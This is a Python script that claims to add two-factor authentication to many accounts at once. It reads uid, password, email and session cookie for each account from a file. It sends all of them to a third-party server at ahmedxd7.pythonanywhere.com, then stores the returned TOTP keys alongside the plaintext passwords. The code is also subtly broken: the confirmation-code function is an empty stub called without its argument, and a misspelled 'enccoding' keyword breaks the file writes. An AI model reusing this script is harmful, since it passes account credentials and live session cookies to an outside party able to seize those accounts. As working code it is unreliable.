import time
try:
    import requests
except ModuleNotFoundError:
    import os
    os.system("pip install requests")
    exit("AGAIN RUN THE TOOL")


print("-"*54)
print("AUTO TWO FACTOR AUTHENTICATION ADDING TOOL\nDEVELOPED BY AHMED XD\nFORMAT uid|password|email|cookie")
print("-"*54)

file_path = input("Enter file path : ").strip()


def get_code(email):
    """
    CODE IT ON YOUR OWN TO GET CONFIRMATION CODE
    OR INFORM ME TO ADD YOUR MAIL SERVICE
    """
    return


def start(uid,password,email,cookie):
    data = {
        'uid':uid,
        'password':password,
        'cookie':cookie,
        'email':email
    }
    resp1 = requests.post("https://ahmedxd7.pythonanywhere.com/auth1",data=data).json()
    if not resp1['error']:
        if resp1['data'] == 0:
            totp_key = resp1['2F_KEY']
            print(f'\033[1;32m[SUCCESSFULL] {uid}|{totp_key}')
            open("success.txt","a",enccoding='utf-8').write(f"{uid}|{password}|{email}|{totp_key}|{cookie}\n")
            return
        time.sleep(5)
        code = get_code()
        data.update({
            'data':resp1['data'],
            'token':resp1['token'],
            'code':code
        })
        resp2 = requests.post("https://ahmedxd7.pythonanywhere.com/auth2",data=data).json()
        if not resp2['error']:
            totp_key = resp2['2F_KEY']
            print(f'\033[1;32m[SUCCESSFULL] {uid}|{totp_key}')
            open("success.txt","a",enccoding='utf-8').write(f"{uid}|{password}|{email}|{totp_key}|{cookie}\n")
        else:
            print(f'\033[1;31m[FAILED] {uid}|{resp2["reason"]}')
    else:
        print(f'\033[1;31m[FAILED] {uid}|{resp1["reason"]}')


try:
    file_data = open(file_path,'r',encoding='utf-8').read().splitlines()
    for data in file_data:
        uid,password,email,cookie = data.strip().split("|")
        start(uid,password,email,cookie)
except FileNotFoundError:
    print("FILE NOT FOUND")
